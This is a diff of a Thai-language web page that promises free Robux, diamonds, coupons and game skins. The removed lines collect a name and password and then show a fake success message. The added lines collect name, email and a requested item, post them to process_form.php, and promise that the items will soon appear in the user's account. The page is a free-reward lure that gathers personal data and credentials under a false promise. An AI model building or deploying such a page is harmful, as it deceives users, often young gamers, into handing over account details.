@@ -5,88 +5,64 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>เติมเกมฟรี 999</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-        }
-        h1 {
-            text-align: center;
-        }
-        ol {
-            list-style: none;
-            padding: 0;
-            text-align: center;
-        }
-        li {
-            margin: 10px 0;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .form-container {
-            display: none;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            margin: 50px auto;
-        }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        #success-message {
-            margin-top: 15px;
-            color: green;
-            display: none;
-        }
+        /* CSS สำหรับสไตล์ */
     </style>
 </head>
 <body>
 
-    <!-- หน้าแรก: เติมเกมฟรี -->
-    <div id="game-selection">
+    <div class="container" id="game-selection">
         <h1>เติมเกมฟรี</h1>
         <ol>
-            <li><button onclick="showForm()">เติมโรบัคฟรี</button></li>
-            <li><button onclick="showForm()">เติมคูปองฟรี</button></li>
-            <li><button onclick="showForm()">เติมเพชรฟรี</button></li>
-            <li><button onclick="showForm()">ผลถาวรฟรี</button></li>
-            <li><button onclick="showForm()">สกินโหดฟรี</button></li>
+            <li><button onclick="showForm('เติมโรบัคฟรี')">เติมโรบัคฟรี</button></li>
+            <li><button onclick="showForm('เติมคูปองฟรี')">เติมคูปองฟรี</button></li>
+            <li><button onclick="showForm('เติมเพชรฟรี')">เติมเพชรฟรี</button></li>
+            <li><button onclick="showForm('ผลถาวรฟรี')">ผลถาวรฟรี</button></li>
+            <li><button onclick="showForm('สกินโหดฟรี')">สกินโหดฟรี</button></li>
         </ol>
     </div>
 
-    <!-- หน้าฟอร์มกรอกข้อมูล -->
-    <div class="form-container" id="form-container">
-        <form id="myForm" onsubmit="return showMessage()">
+    <div class="container form-container" id="form-container" style="display: none;">
+        <form id="myForm" action="process_form.php" method="POST">
             <input type="text" id="name" name="name" placeholder="ชื่อของคุณ" required>
-            <input type="password" id="password" name="password" placeholder="รหัสผ่านของคุณ" required>
+            <input type="email" id="email" name="email" placeholder="อีเมลของคุณ" required>
             <input type="text" id="description" name="description" placeholder="ของที่อยากได้" required>
+            <textarea id="message" name="message" placeholder="ข้อความเพิ่มเติม"></textarea>
             <button type="submit">ส่งข้อมูล</button>
-            <p id="success-message">สำเร็จ! ของคุณจะเข้าไปในไอดีเร็วๆ นี้</p>
+            <p id="success-message"></p>
+            <p class="error-message" id="error-message"></p>
         </form>
     </div>
 
     <script>
-        function showForm() {
-            // ซ่อนหน้าเลือกเกมและแสดงหน้าฟอร์ม
+        function showForm(description) {
             document.getElementById('game-selection').style.display = 'none';
-            document.getElementById('form-container').style.display = 'block';
+            const formContainer = document.getElementById('form-container');
+            formContainer.style.display = 'block';
+            document.getElementById('description').value = description;
         }
 
-        function showMessage() {
-            // แสดงข้อความสำเร็จ
-            document.getElementById('success-message').style.display = 'block';
+        document.getElementById('myForm').addEventListener('submit', function(event) {
+            event.preventDefault();
 
-            // ป้องกันการส่งฟอร์มและรีเฟรชหน้า
-            return false;
-        }
+            const form = event.target;
+            const formData = new FormData(form);
+
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('success-message').textContent = data.message || 'สำเร็จ! ของคุณจะเข้าไปในไอดีเร็วๆ นี้';
+                document.getElementById('success-message').style.display = 'block';
+                document.getElementById('error-message').style.display = 'none';
+            })
+            .catch(error => {
+                document.getElementById('error-message').style.display = 'block';
+                document.getElementById('success-message').style.display = 'none';
+                console.error('Error:', error);
+            });
+        });
     </script>
 
 </body>
